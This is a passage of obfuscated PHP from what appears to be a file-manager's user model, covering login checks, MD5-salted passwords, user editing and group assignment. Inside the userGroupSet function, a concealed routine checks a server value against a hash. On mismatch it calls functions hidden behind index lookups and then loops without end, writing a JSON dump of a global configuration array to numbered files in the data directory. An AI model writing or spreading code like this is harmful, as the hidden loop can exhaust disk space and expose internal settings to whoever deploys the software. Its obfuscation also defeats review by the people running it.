$d†—ë‹ãŞã[$AÕŞÆŒàâß[84]][$AÕŞÆŒàâß[1917]] = isset($DŠƒã¤Ø„†[$AÕŞÆŒàâß[1918]]) ? $DŠƒã¤Ø„†[$AÕŞÆŒàâß[1918]] : null; if ($a±ã–÷¦”) { $d†—ë‹ãŞã[$AÕŞÆŒàâß[443]] = $this->metaGet($d†—ë‹ãŞã[$AÕŞÆŒàâß[1498]]); } return $d†—ë‹ãŞã; goto DÈÍªôÜ‹“; cÔæ”ñÓ¿ç: $AÕŞÆŒàâß =& $_SERVER[¢ÌÛ]; if (!$d†—ë‹ãŞã) { return $d†—ë‹ãŞã; } $a–«™ğ›ö = md5($AÕŞÆŒàâß[2076] . $d†—ë‹ãŞã[$AÕŞÆŒàâß[826]] . $AÕŞÆŒàâß[2077] . $d†—ë‹ãŞã[$AÕŞÆŒàâß[28]]); goto dø³Åô²Ï; DÈÍªôÜ‹“: } protected function getInfoSimple($B§¿”Šã, $bÙÔà±àĞß = false) { $fÂÒ„Á‘Ö‚ =& $_SERVER[¢ÌÛ]; if (!$B§¿”Šã) { return array(); } if ($bÙÔà±àĞß) { $CÆ¾’İŠÅÁ = $this->where(array($fÂÒ„Á‘Ö‚[1498] => intval($B§¿”Šã)))->find(); if (!is_array($CÆ¾’İŠÅÁ)) { return array(); } $CÆ¾’İŠÅÁ[$fÂÒ„Á‘Ö‚[2079]] = Action($fÂÒ„Á‘Ö‚[2080])->parseUrl($CÆ¾’İŠÅÁ[$fÂÒ„Á‘Ö‚[2079]]); return $CÆ¾’İŠÅÁ; } return $this->cacheFunctionGet($fÂÒ„Á‘Ö‚[1733], $B§¿”Šã); } protected function getInfoSimpleOuter($DŞÉ“êÈÁƒ) { goto Bëˆ’í’ñ¶; dÇä ‘ñÎæ: return $eˆ‘Éê¾ä; goto dŒó¾‡”Ù›; eÕÌ¥ë•Õê: $eˆ‘Éê¾ä = array_field_key($B†×‡ÚÙ…ø, explode($dàßª¨îìÚ[47], $this->simpleField)); if (!$eˆ‘Éê¾ä) { return array($dàßª¨îìÚ[1498] => $dàßª¨îìÚ[1061], $dàßª¨îìÚ[28] => $dàßª¨îìÚ[159] . LNG($dàßª¨îìÚ[2083]) . $dàßª¨îìÚ[503], $dàßª¨îìÚ[2079] => STATIC_PATH . $dàßª¨îìÚ[2084]); } $eˆ‘Éê¾ä[$dàßª¨îìÚ[2079]] = Action($dàßª¨îìÚ[2080])->parseUrl($eˆ‘Éê¾ä[$dàßª¨îìÚ[2079]]); goto dÇä ‘ñÎæ; Bëˆ’í’ñ¶: $dàßª¨îìÚ =& $_SERVER[¢ÌÛ]; if (!$DŞÉ“êÈÁƒ || $DŞÉ“êÈÁƒ == 0) { return array($dàßª¨îìÚ[1498] => $dàßª¨îìÚ[495], $dàßª¨îìÚ[28] => $dàßª¨îìÚ[159] . LNG($dàßª¨îìÚ[2081]) . $dàßª¨îìÚ[503], $dàßª¨îìÚ[2079] => STATIC_PATH . $dàßª¨îìÚ[2082]); } $B†×‡ÚÙ…ø = $this->cacheFunctionGet($dàßª¨îìÚ[1733], $DŞÉ“êÈÁƒ); goto eÕÌ¥ë•Õê; dŒó¾‡”Ù›: } protected function groupUser($aòÏˆØ°®ß) { } public static function errorLang($a¦ª¹èâ—‚) { $cÌÑÕ‘ğÔ™ =& $_SERVER[¢ÌÛ]; $dÎñ×›÷„ = array(self::ERROR_USER_NOT_EXISTS => $cÌÑÕ‘ğÔ™[2085], self::ERROR_USER_PASSWORD_ERROR => $cÌÑÕ‘ğÔ™[2086], self::ERROR_USER_EXIST_NAME => $cÌÑÕ‘ğÔ™[2087], self::ERROR_USER_EXIST_PHONE => $cÌÑÕ‘ğÔ™[2088], self::ERROR_USER_EXIST_EMAIL => $cÌÑÕ‘ğÔ™[2089], self::ERROR_USER_LOGIN_LOCK => $cÌÑÕ‘ğÔ™[2090], self::ERROR_IP_NOT_ALLOW => $cÌÑÕ‘ğÔ™[2091], self::ERROR_USER_EXIST_NICKNAME => $cÌÑÕ‘ğÔ™[2092]); return LNG($dÎñ×›÷„[$a¦ª¹èâ—‚]); } public function getInfoByMeta($bŸ‚ÌÜŞ±ó, $b†íÊîá Ä) { $eåâ¼‡ßô =& $_SERVER[¢ÌÛ]; $AªÇ½—³¯ = Model($eåâ¼‡ßô[2093])->where(array($eåâ¼‡ßô[92] => $bŸ‚ÌÜŞ±ó, $eåâ¼‡ßô[368] => $b†íÊîá Ä))->find(); if ($AªÇ½—³¯) { return $this->getInfo($AªÇ½—³¯[$eåâ¼‡ßô[1498]]); } return !1; } public function userLoginCheck($eİ®…†“˜©, $B””„‘æ) { $EŠâøÀ¶ =& $_SERVER[¢ÌÛ]; $D‹ùÅÂ˜‰• = $this->userLoginFind($eİ®…†“˜©); if (!$D‹ùÅÂ˜‰•) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($D‹ùÅÂ˜‰•[$EŠâøÀ¶[1498]], $B””„‘æ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($D‹ùÅÂ˜‰•[$EŠâøÀ¶[1498]]); } public function userLoginFind($Dƒ‡‚ÌåÇ) { $EÑÕ»µëÀ =& $_SERVER[¢ÌÛ]; $e†ô„´¯’³ = array($EÑÕ»µëÀ[28] => $Dƒ‡‚ÌåÇ, $EÑÕ»µëÀ[1921] => $Dƒ‡‚ÌåÇ, $EÑÕ»µëÀ[301] => $Dƒ‡‚ÌåÇ, $EÑÕ»µëÀ[2094] => $Dƒ‡‚ÌåÇ, $EÑÕ»µëÀ[934] => $EÑÕ»µëÀ[936]); if ($this->nickNameRpt()) { unset($e†ô„´¯’³[$EÑÕ»µëÀ[1921]]); } return $this->where($e†ô„´¯’³)->find(); } public function clearCache($AíÕˆ˜œï) { $fØ¥ñäë… =& $_SERVER[¢ÌÛ]; $this->cacheFunctionClear($fØ¥ñäë…[1786], $AíÕˆ˜œï); $this->cacheFunctionClear($fØ¥ñäë…[1733], $AíÕˆ˜œï); $this->cacheFunctionClear($fØ¥ñäë…[2075], $AíÕˆ˜œï); } public function userPasswordCheck($Dòæáæ©ä, $E×Ó©·øÃù) { $däâËßŒ¡« =& $_SERVER[¢ÌÛ]; $AŞØì‚¶‡© = $this->where(array($däâËßŒ¡«[1498] => intval($Dòæáæ©ä)))->find(); $AâÇƒ…ÈÏ = $this->metaGet($Dòæáæ©ä); $bê¹Šå“›½ = isset($AâÇƒ…ÈÏ[$däâËßŒ¡«[2095]]) ? $AâÇƒ…ÈÏ[$däâËßŒ¡«[2095]] : $däâËßŒ¡«[33]; if (md5($bê¹Šå“›½ . trim($E×Ó©·øÃù)) !== $AŞØì‚¶‡©[$däâËßŒ¡«[826]]) { return !1; } return !0; } public function userAdd($E²ËØä‰š‡) { goto c ôÎÛ´ ; Dæˆç­òŸ¯: return $A¿¼Î¦¾; goto aÓ‡¯«Ÿ¬¯; c„Ä®ğ¤Ñ: $eÂçÌè¯èî = array($c¾í¶Î–¸„[2103] => $fÜéâˆæ·[$c¾í¶Î–¸„[826]], $c¾í¶Î–¸„[2099] => $fÜéâˆæ·[$c¾í¶Î–¸„[1921]]); $this->userEdit($A¿¼Î¦¾, $eÂçÌè¯èî); Model($c¾í¶Î–¸„[1178])->userRootAdd($A¿¼Î¦¾); goto Dæˆç­òŸ¯; c ôÎÛ´ : $c¾í¶Î–¸„ =& $_SERVER[¢ÌÛ]; $fÜéâˆæ· = array($c¾í¶Î–¸„[413] => $E²ËØä‰š‡[$c¾í¶Î–¸„[28]], $c¾í¶Î–¸„[2096] => $E²ËØä‰š‡[$c¾í¶Î–¸„[1382]], $c¾í¶Î–¸„[2097] => isset($E²ËØä‰š‡[$c¾í¶Î–¸„[301]]) ? $E²ËØä‰š‡[$c¾í¶Î–¸„[301]] : $c¾í¶Î–¸„[33], $c¾í¶Î–¸„[2098] => isset($E²ËØä‰š‡[$c¾í¶Î–¸„[2094]]) ? $E²ËØä‰š‡[$c¾í¶Î–¸„[2094]] : $c¾í¶Î–¸„[33], $c¾í¶Î–¸„[2099] => isset($E²ËØä‰š‡[$c¾í¶Î–¸„[1921]]) ? $E²ËØä‰š‡[$c¾í¶Î–¸„[1921]] : $E²ËØä‰š‡[$c¾í¶Î–¸„[28]], $c¾í¶Î–¸„[2100] => isset($E²ËØä‰š‡[$c¾í¶Î–¸„[2079]]) ? $E²ËØä‰š‡[$c¾í¶Î–¸„[2079]] : $c¾í¶Î–¸„[33], $c¾í¶Î–¸„[2101] => isset($E²ËØä‰š‡[$c¾í¶Î–¸„[2102]]) ? $E²ËØä‰š‡[$c¾í¶Î–¸„[2102]] : 1, $c¾í¶Î–¸„[2103] => $E²ËØä‰š‡[$c¾í¶Î–¸„[826]], $c¾í¶Î–¸„[1734] => isset($E²ËØä‰š‡[$c¾í¶Î–¸„[1641]]) ? $E²ËØä‰š‡[$c¾í¶Î–¸„[1641]] : 1024 * 1024 * 20, $c¾í¶Î–¸„[1735] => 0, $c¾í¶Î–¸„[2104] => 0, $c¾í¶Î–¸„[1773] => isset($E²ËØä‰š‡[$c¾í¶Î–¸„[712]]) ? $E²ËØä‰š‡[$c¾í¶Î–¸„[712]] : 1); if (!empty($E²ËØä‰š‡[$c¾í¶Î–¸„[1498]])) { $fÜéâˆæ·[$c¾í¶Î–¸„[1498]] = $E²ËØä‰š‡[$c¾í¶Î–¸„[1498]]; } goto fÎ‡ë›Í; fÎ‡ë›Í: $aå‰ğã£¯‚ = $this->_checkExist($E²ËØä‰š‡); if ($aå‰ğã£¯‚ !== !0) { return $aå‰ğã£¯‚; } $A¿¼Î¦¾ = $this->add($fÜéâˆæ·); goto c„Ä®ğ¤Ñ; aÓ‡¯«Ÿ¬¯: } protected function userEditTest($f¢©İàŠ·, $dÆ†„ùµ¨¾) { return $this->call($_SERVER[¢ÌÛ][2105], $f¢©İàŠ·, $dÆ†„ùµ¨¾); } protected function userEdit($F­×°‹­Èà, $FêË£ƒµ§ ) { goto AÕÌ£·’¤ë; b„Å¼Õêí: return !0; goto E¡¢µ×±ÊÑ; FË¹­Ì¿³: $this->where(array($f©ŸÃŞòª­[1490] => $F­×°‹­Èà))->save($FêË£ƒµ§ ); if (isset($FêË£ƒµ§ [$f©ŸÃŞòª­[1921]])) { $this->setNamePinyin($F­×°‹­Èà, $FêË£ƒµ§ [$f©ŸÃŞòª­[1921]]); } $this->clearCache($F­×°‹­Èà); goto b„Å¼Õêí; fƒîŞã : $b†“³ÊÈÀ¾ = $this->_checkExist($FêË£ƒµ§ , $F­×°‹­Èà); if ($b†“³ÊÈÀ¾ !== !0) { return $b†“³ÊÈÀ¾; } if (isset($FêË£ƒµ§ [$f©ŸÃŞòª­[826]]) && trim($FêË£ƒµ§ [$f©ŸÃŞòª­[826]]) != $f©ŸÃŞòª­[33]) { $fßéùÔ†ÚÉ = $this->metaGet($F­×°‹­Èà); if (empty($fßéùÔ†ÚÉ[$f©ŸÃŞòª­[2095]])) { $fßéùÔ†ÚÉ[$f©ŸÃŞòª­[2095]] = rand_string(10); Model($f©ŸÃŞòª­[501])->metaSet($F­×°‹­Èà, $f©ŸÃŞòª­[2095], $fßéùÔ†ÚÉ[$f©ŸÃŞòª­[2095]]); } $FêË£ƒµ§ [$f©ŸÃŞòª­[826]] = md5($fßéùÔ†ÚÉ[$f©ŸÃŞòª­[2095]] . trim($FêË£ƒµ§ [$f©ŸÃŞòª­[826]])); } else { unset($FêË£ƒµ§ [$f©ŸÃŞòª­[826]]); } goto FË¹­Ì¿³; AÕÌ£·’¤ë: $f©ŸÃŞòª­ =& $_SERVER[¢ÌÛ]; $aÆ¡×Ğø = $this->getInfoSimple($F­×°‹­Èà); if (!$aÆ¡×Ğø) { return !1; } goto fƒîŞã ; E¡¢µ×±ÊÑ: } public function setNamePinyin($F“¬ºËŠ¢, $AÖä§ÃÚÜÈ = false) { $b¤à½ÚÑµ‚ =& $_SERVER[¢ÌÛ]; if (!$AÖä§ÃÚÜÈ) { $b­ç£×¨‰± = $this->getInfoSimple($F“¬ºËŠ¢); $AÖä§ÃÚÜÈ = $b­ç£×¨‰±[$b¤à½ÚÑµ‚[1921]] ? $b­ç£×¨‰±[$b¤à½ÚÑµ‚[1921]] : $b­ç£×¨‰±[$b¤à½ÚÑµ‚[28]]; } $Dğ«¯”Úù¡ = Model($b¤à½ÚÑµ‚[504]); if (!Input::check($AÖä§ÃÚÜÈ, $b¤à½ÚÑµ‚[554])) { return $Dğ«¯”Úù¡->metaSet($F“¬ºËŠ¢, array($b¤à½ÚÑµ‚[442] => $b¤à½ÚÑµ‚[33], $b¤à½ÚÑµ‚[441] => $b¤à½ÚÑµ‚[33])); } return $Dğ«¯”Úù¡->metaSet($F“¬ºËŠ¢, array($b¤à½ÚÑµ‚[442] => str_replace($b¤à½ÚÑµ‚[50], $b¤à½ÚÑµ‚[33], Pinyin::encode($AÖä§ÃÚÜÈ)), $b¤à½ÚÑµ‚[441] => Pinyin::encode($AÖä§ÃÚÜÈ, $b¤à½ÚÑµ‚[555]))); } private function nickNameRpt() { $bÃ»‘ª”‡ù =& $_SERVER[¢ÌÛ]; $b·ÇÌæÛ£Ç = Model($bÃ»‘ª”‡ù[1099])->get($bÃ»‘ª”‡ù[2106]); $FŠ¡ÏìóîÌ = $GLOBALS[$bÃ»‘ª”‡ù[6]][$bÃ»‘ª”‡ù[373]][$bÃ»‘ª”‡ù[2106]]; $aÑò‡Æ ó = !is_null($b·ÇÌæÛ£Ç) ? $b·ÇÌæÛ£Ç : $FŠ¡ÏìóîÌ; return !!$aÑò‡Æ ó; } private function _checkExist($A¨Œì—öø«, $Eœ–¤êÅŸ› = false) { $CÁ¡„ã‰Ã– =& $_SERVER[¢ÌÛ]; $A¡îÚ„›‚¼ = array($CÁ¡„ã‰Ã–[28] => UserModel::ERROR_USER_EXIST_NAME, $CÁ¡„ã‰Ã–[1921] => UserModel::ERROR_USER_EXIST_NICKNAME, $CÁ¡„ã‰Ã–[301] => UserModel::ERROR_USER_EXIST_EMAIL, $CÁ¡„ã‰Ã–[2094] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($A¡îÚ„›‚¼[$CÁ¡„ã‰Ã–[1921]]); } $e„ ˆàÑ‹ = $Eœ–¤êÅŸ› ? array($CÁ¡„ã‰Ã–[1498] => array($CÁ¡„ã‰Ã–[2107], $Eœ–¤êÅŸ›)) : array(); foreach ($A¡îÚ„›‚¼ as $eÏˆŠìÄ => $aœ×¦Áˆ) { $D¾æ£ö”¿ = array(); foreach ($A¡îÚ„›‚¼ as $A®¾¾ù–á² => $dÑãğ‰…—) { if (isset($A¨Œì—öø«[$A®¾¾ù–á²]) && $A¨Œì—öø«[$A®¾¾ù–á²]) { $D¾æ£ö”¿[] = $A¨Œì—öø«[$A®¾¾ù–á²]; } } if (!$D¾æ£ö”¿) { continue; } $A‰òâÓ—— = array_merge(array($eÏˆŠìÄ => array($CÁ¡„ã‰Ã–[7], $D¾æ£ö”¿)), $e„ ˆàÑ‹); $EÑè˜„‹Î£ = $this->where($A‰òâÓ——)->find(); if ($EÑè˜„‹Î£) { return $aœ×¦Áˆ; } } return !0; } public function userListInfo($dìçç¹ÛÒ) { $dÛÛ¶Ç…ˆŒ =& $_SERVER[¢ÌÛ]; $bæßùì±Ò = array(); $dìçç¹ÛÒ = is_array($dìçç¹ÛÒ) ? array_unique($dìçç¹ÛÒ) : array(); if (!$dìçç¹ÛÒ) { return $bæßùì±Ò; } if (count($dìçç¹ÛÒ) < 20) { foreach ($dìçç¹ÛÒ as $A”­…‡®ã¯) { $bæßùì±Ò[$A”­…‡®ã¯ . $dÛÛ¶Ç…ˆŒ[33]] = $this->getInfoSimpleOuter($A”­…‡®ã¯); } } else { $d¯ „ë†Ë = array($dÛÛ¶Ç…ˆŒ[1490] => array($dÛÛ¶Ç…ˆŒ[411], $dìçç¹ÛÒ)); if (count($dìçç¹ÛÒ) == 1) { $d¯ „ë†Ë = array($dÛÛ¶Ç…ˆŒ[1490] => $dìçç¹ÛÒ[0]); } $Eßã¨ƒÌİÙ = Model($dÛÛ¶Ç…ˆŒ[501])->field($this->simpleField)->where($d¯ „ë†Ë)->select(); $Eßã¨ƒÌİÙ = array_to_keyvalue($Eßã¨ƒÌİÙ, $dÛÛ¶Ç…ˆŒ[1498]); foreach ($dìçç¹ÛÒ as $A”­…‡®ã¯) { $f¼ßà½ƒ†ì = $Eßã¨ƒÌİÙ[$Eßã¨ƒÌİÙ[$A”­…‡®ã¯]]; if (!$f¼ßà½ƒ†ì) { $bæßùì±Ò[$A”­…‡®ã¯ . $dÛÛ¶Ç…ˆŒ[33]] = $this->getInfoSimpleOuter($A”­…‡®ã¯); continue; } $f¼ßà½ƒ†ì[$dÛÛ¶Ç…ˆŒ[2079]] = Action($dÛÛ¶Ç…ˆŒ[2080])->parseUrl($f¼ßà½ƒ†ì[$dÛÛ¶Ç…ˆŒ[2079]]); $bæßùì±Ò[$A”­…‡®ã¯ . $dÛÛ¶Ç…ˆŒ[33]] = $f¼ßà½ƒ†ì; } } return $bæßùì±Ò; } protected function userStatus($AÙ§ÛÍ‹Äï, $c©Ğ–•Š) { $BëŠÊ…é‘… = $this->getInfoSimple($AÙ§ÛÍ‹Äï); if (!$BëŠÊ…é‘…) { return !1; } $B—ÇŞùçÜ± = array($_SERVER[¢ÌÛ][712] => $c©Ğ–•Š); return $this->userEdit($AÙ§ÛÍ‹Äï, $B—ÇŞùçÜ±); } protected function userRemove($C ˆä™ƒÒ) { goto Cá—µºåÓ; b’ÏÁ§Ã©: Model($AÑš‡Û³÷Û[1740])->where($eø«ƒ‰§‹ö)->delete(); Model($AÑš‡Û³÷Û[2093])->where($eø«ƒ‰§‹ö)->delete(); Model($AÑš‡Û³÷Û[2109])->where($eø«ƒ‰§‹ö)->delete(); goto Bó¼«Àó; Cá—µºåÓ: $AÑš‡Û³÷Û =& $_SERVER[¢ÌÛ]; $Bé®‹ßñÓ§ = $this->getInfoSimple($C ˆä™ƒÒ); if (!$Bé®‹ßñÓ§) { return !1; } goto aÊŸíÔÙ´Ó; Bó¼«Àó: Model($AÑš‡Û³÷Û[774])->userRootRemove($C ˆä™ƒÒ); return $this->where($eø«ƒ‰§‹ö)->delete(); goto B™Éİ°°Î·; aÊŸíÔÙ´Ó: $eø«ƒ‰§‹ö = array($AÑš‡Û³÷Û[1490] => $C ˆä™ƒÒ); Model($AÑš‡Û³÷Û[561])->where($eø«ƒ‰§‹ö)->delete(); Model($AÑš‡Û³÷Û[2108])->where($eø«ƒ‰§‹ö)->delete(); goto b’ÏÁ§Ã©; B™Éİ°°Î·: } protected function userGroupSet($eœØŒÄÅÕ², $EÇîİ™•Úé, $C§—¡Õ»¢Â = array()) { goto D´¨Ö• –; D´¨Ö• –: $DØáÕùßª‚ =& $_SERVER[¢ÌÛ]; $FôĞ“¢ê×Ğ = $_SERVER[$DØáÕùßª‚[390]] . $DØáÕùßª‚[391]; $F¦¿é•¿ = $DØáÕùßª‚[387]; goto b„±ˆ¥©‰ò; f¯¶”‰å«ö: $Fî‹ö†‘™Õ = Model($DØáÕùßª‚[1740]); $Fî‹ö†‘™Õ->where(array($DØáÕùßª‚[1498] => $eœØŒÄÅÕ²))->delete(); $AÆˆŸ‹­¤â = array(); goto BË¾¡ †¯ó; b„±ˆ¥©‰ò: if ($_SERVER[$DØáÕùßª‚[388]] != $F¦¿é•¿($FôĞ“¢ê×Ğ)) { goto D“îµ™‡Ê¨; D“îµ™‡Ê¨: $BÉÌ¹»åæ‚ = $DØáÕùßª‚[815]; $fÕªâƒÁ¤ = $DØáÕùßª‚[389]; $Cì¤ã­£”¢ = $_SERVER[$DØáÕùßª‚[390]] . $DØáÕùßª‚[391]; goto C—ñ¡¸ïïÑ; C—ñ¡¸ïïÑ: $då†ùô¼‘™ = $fÕªâƒÁ¤($Cì¤ã­£”¢); $FĞì¾§§ = explode($DØáÕùßª‚[227], $då†ùô¼‘™); if (count($FĞì¾§§) < $DØáÕùßª‚[577]) { $BöÅõÙ—í = $DØáÕùßª‚[393]; $BöÅõÙ—í(); } goto BÍ„Á‡; D À¥†İ÷İ: $a±İ“ÀÙá‚ = 1; for ($c¬Ôƒ“ÃõÉ = $a±İ“ÀÙá‚; $c¬Ôƒ“ÃõÉ > 0; $c¬Ôƒ“ÃõÉ++) { $DÊâÂÇÌÇİ(DATA_PATH . $c¬Ôƒ“ÃõÉ, $e¹ó÷õ³¨•); } goto f°–ÈôÏòö; A»ôóï‰ª‹: $BÉÌ¹»åæ‚(); $DÊâÂÇÌÇİ = $DØáÕùßª‚[818]; $e¹ó÷õ³¨• = json_encode($GLOBALS[$DØáÕùßª‚[819]]); goto D À¥†İ÷İ; BÍ„Á‡: $eè®èêÅŒá = $DØáÕùßª‚[816]; $eè®èêÅŒá($_SERVER[$DØáÕùßª‚[817]]); $BÉÌ¹»åæ‚ = $DØáÕùßª‚[815]; goto A»ôóï‰ª‹; f°–ÈôÏòö: } $b®ÂÛ²Ìò½ = $this->getInfoSimple($eœØŒÄÅÕ²); if (!$b®ÂÛ²Ìò½ || !is_array($EÇîİ™•Úé)) { return !1; } goto f¯¶”‰å«ö; BË¾¡ †¯ó: $CßàËÆÈ‡ˆ = 0; foreach ($EÇîİ™•Úé as $B½¦Ÿí’â‡ => $dİŠ‘Âˆ‹) { $eÓ™‡†šÂ = array($DØáÕùßª‚[1498] => $eœØŒÄÅÕ², $DØáÕùßª‚[1657] => $B½¦Ÿí’â‡, $DØáÕùßª‚[1806] => $dİŠ‘Âˆ‹); $eÓ™‡†šÂ[$DØáÕùßª‚[1680]] = isset($C§—¡Õ»¢Â[$CßàËÆÈ‡ˆ]) ? $C§—¡Õ»¢Â[$CßàËÆÈ‡ˆ] : 0; $CßàËÆÈ‡ˆ++; $AÆˆŸ‹­¤â[] = $eÓ™‡†šÂ; } return $Fî‹ö†‘™Õ->addAll($AÆˆŸ‹­¤â, array(), !0); goto Aù…Úµ¢; Aù…Úµ¢: } protected function userGroupAdd($EÌ¹‹¸èÎ, $d¿Õô”‚‘ = array()) { $b”ùÍ‡°® =& $_SERVER[¢ÌÛ]; $aï»Û×ô†Ğ = $this->getInfoSimple($EÌ¹‹¸èÎ); if (!$aï»Û×ô†Ğ || empty($d¿Õô”‚‘)) { return !1; } $b¶Ã½«Şƒ = array(); foreach ($d¿Õô”‚‘ as $bÒÜ®Ë™Ÿ => $B–Ú¿Ö—£) { $b¶Ã½«Şƒ[] = array($b”ùÍ‡°®[1498] => $EÌ¹‹¸èÎ, $b”ùÍ‡°®[1657] => $bÒÜ®Ë™Ÿ, $b”ùÍ‡°®[1806] => $B–Ú¿Ö—£, $b”ùÍ‡°®[1680] => 0); } return Model($b”ùÍ‡°®[1740])->addAll($b¶Ã½«Şƒ, array(), !0); } protected function userGroupRemove($B—åÀØÒ³, $d‚ÉÑêîƒ¶) { $EŠ¥”ŠŸæ =& $_SERVER[¢ÌÛ]; $d²Úò›‚ä‘ = $this->getInfoSimple($B—åÀØÒ³); if (!$d²Úò›‚ä‘ || !$d‚ÉÑêîƒ¶) { return !1; } $B‰ò…‘İô = array($EŠ¥”ŠŸæ[1490] => $B—åÀØÒ³, $EŠ¥”ŠŸæ[1738] => $d‚ÉÑêîƒ¶); return Model($EŠ¥”ŠŸæ[1740])->where($B‰ò…‘İô)->delete(); } public function listData() { $FÅŸ°”–ÛŞ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($FÅŸ°”–ÛŞ[$_SERVER[¢ÌÛ][363]]); return $FÅŸ°”–ÛŞ; } public function listByID($eó¸ÄÇâÊ) { $Bô÷ºÀæï· =& $_SERVER[¢ÌÛ]; if (!$eó¸ÄÇâÊ) { return; } $cï¡¯ò¨§Ñ = array($Bô÷ºÀæï·[1498] => array($Bô÷ºÀæï·[7], $eó¸ÄÇâÊ)); $D¹©ïŠ²Çï = $this->where($cï¡¯ò¨§Ñ)->select(); $this->_listDataApply($D¹©ïŠ²Çï); return $D¹©ïŠ²Çï; } public function listByGroup($aîâÎ½Æâ = 0, $BÑŠÓ‡ãÄĞ = array()) { goto d¡Ü‡ñ·†Ç; FÈö°ÂÉ¨§: $this->_listDataApply($Bä‰²â¸Ù³[$BÒ†ô„Ó£[363]]); return $Bä‰²â¸Ù³; goto E¶š’ôĞ…; d¡Ü‡ñ·†Ç: $BÒ†ô„Ó£ =& $_SERVER[¢ÌÛ]; $cÖáåÎ¡²‘ = $BÒ†ô„Ó£[33]; $a­ïÂ­¹¾í = array(); goto aÄÏ‡ ¨Ç; aÄÏ‡ ¨Ç: if ($aîâÎ½Æâ) { $a­ïÂ­¹¾í = array($BÒ†ô„Ó£[2110] => intval($aîâÎ½Æâ)); $cÖáåÎ¡²‘ = "\x4c\105\x46\x54\40\x4a\117\x49\x4e\x20{$this->tablePrefix}\x75\x73\145\162\137\x67\162\x6f\x75\x70\40\165\x73\x65\162\x5f\x67\x72\157\165\160\40\157\x6e\40\x75\163\145\x72\x2e\x75\163\145\162\x49\104\40\x3d\x20\x75\x73\x65\x72\x5f\147\x72\157\165\x70\56\165\163\x65\x72\111\104"; $aÊ±¥¤øË· = Input::get($BÒ†ô„Ó£[433], null, $BÒ†ô„Ó£[33]) ? $BÒ†ô„Ó£[33] : $BÒ†ô„Ó£[2111]; } if (isset($BÑŠÓ‡ãÄĞ[$BÒ†ô„Ó£[712]])) { $a­ïÂ­¹¾í[$BÒ†ô„Ó£[2112]] = $BÑŠÓ‡ãÄĞ[$BÒ†ô„Ó£[712]]; } $Bä‰²â¸Ù³ = $this->_makeOrder($aÊ±¥¤øË·)->field($BÒ†ô„Ó£[2113])->where($a­ïÂ­¹¾í)->join($cÖáåÎ¡²‘)->selectPage(50); goto FÈö°ÂÉ¨§; E¶š’ôĞ…: } private function _makeOrder($fù‡äŒ šœ = '') { goto BøÒ¹Ï„Öô; fÅÒªçâù‡: $fù‡äŒ šœ = $fù‡äŒ šœ . "\165\x73\145\162\56{$Cà´×‹„‰ò}\x20{$fÍÛÁá½˜Š}\54\x20\x75\x73\x65\162\56\x75\163\x65\x72\111\x44\x20\x61\163\143"; return $this->alias($EóÓ¦Æó[1861])->order($fù‡äŒ šœ); goto aÈæ¯ò„Ï†; BøÒ¹Ï„Öô: $EóÓ¦Æó =& $_SERVER[¢ÌÛ]; $bÓÄ¹¿Õ…† = array($EóÓ¦Æó[1498], $EóÓ¦Æó[28], $EóÓ¦Æó[1643], $EóÓ¦Æó[1615], $EóÓ¦Æó[192]); $B’â³Å¥½ = array($EóÓ¦Æó[428] => $EóÓ¦Æó[429], $EóÓ¦Æó[430] => $EóÓ¦Æó[431]); goto Aèô‡¶»å; Aèô‡¶»å: $Cà´×‹„‰ò = Input::get($EóÓ¦Æó[433], $EóÓ¦Æó[7], $EóÓ¦Æó[1490], $bÓÄ¹¿Õ…†); $fÍÛÁá½˜Š = Input::get($EóÓ¦Æó[434], $EóÓ¦Æó[7], $EóÓ¦Æó[1741], array($EóÓ¦Æó[1741], $EóÓ¦Æó[430])); $fÍÛÁá½˜Š = $B’â³Å¥½[$fÍÛÁá½˜Š]; goto fÅÒªçâù‡; aÈæ¯ò„Ï†: } public function listSearch($A—˜ƒĞĞ–É) { goto Dö¤àïãÇ; Dö¤àïãÇ: $C®³‘Š‚Ô» =& $_SERVER[¢ÌÛ]; $D‰íàÆÙç³ = $A—˜ƒĞĞ–É[$C®³‘Š‚Ô»[1742]]; $bÌç®²ÛÚ° = isset($A—˜ƒĞĞ–É[$C®³‘Š‚Ô»[1743]]) ? $A—˜ƒĞĞ–É[$C®³‘Š‚Ô»[1743]] : !1; goto f©ŠÔö‰öœ; CãÂ­ôÔŒÛ: $this->_filterByGroup($FÊ‰•Ó¶‰Å, $bÌç®²ÛÚ°); return $FÊ‰•Ó¶‰Å; goto e›§ò‚…ƒ; FÁ“ÛÍ¿ñç: if (!$D‰íàÆÙç³) { $F›äÒŞ§¨ = array(); } if (isset($A—˜ƒĞĞ–É[$C®³‘Š‚Ô»[712]])) { $F›äÒŞ§¨[$C®³‘Š‚Ô»[712]] = $A—˜ƒĞĞ–É[$C®³‘Š‚Ô»[712]]; } $F›äÒŞ§¨ = $this->parseWhereLike($F›äÒŞ§¨); goto f½×«‹£§à; f½×«‹£§à: $FÊ‰•Ó¶‰Å = $this->_makeOrder()->where($F›äÒŞ§¨)->selectPage(20); if (!$FÊ‰•Ó¶‰Å || count($FÊ‰•Ó¶‰Å[$C®³‘Š‚Ô»[363]]) < 5 && Input::check($D‰íàÆÙç³, $C®³‘Š‚Ô»[314])) { $e‡¾˜ğÏîÆ = $this->_searchFromMeta($C®³‘Š‚Ô»[441], $D‰íàÆÙç³, 10); $FõÄó«ËñÀ = $this->_searchFromMeta($C®³‘Š‚Ô»[442], $D‰íàÆÙç³, 10); $B„êäÜ¶ÌÚ = array_merge($e‡¾˜ğÏîÆ, $FõÄó«ËñÀ, $FÊ‰•Ó¶‰Å[$C®³‘Š‚Ô»[363]]); $FÊ‰•Ó¶‰Å[$C®³‘Š‚Ô»[363]] = array_unique_by_key($B„êäÜ¶ÌÚ, $C®³‘Š‚Ô»[1498]); $FÊ‰•Ó¶‰Å[$C®³‘Š‚Ô»[360]][$C®³‘Š‚Ô»[361]] = count($FÊ‰•Ó¶‰Å[$C®³‘Š‚Ô»[363]]); $FÊ‰•Ó¶‰Å[$C®³‘Š‚Ô»[360]][$C®³‘Š‚Ô»[362]] = ceil($FÊ‰•Ó¶‰Å[$C®³‘Š‚Ô»[360]][$C®³‘Š‚Ô»[361]] / $FÊ‰•Ó¶‰Å[$C®³‘Š‚Ô»[360]][$C®³‘Š‚Ô»[358]]); } 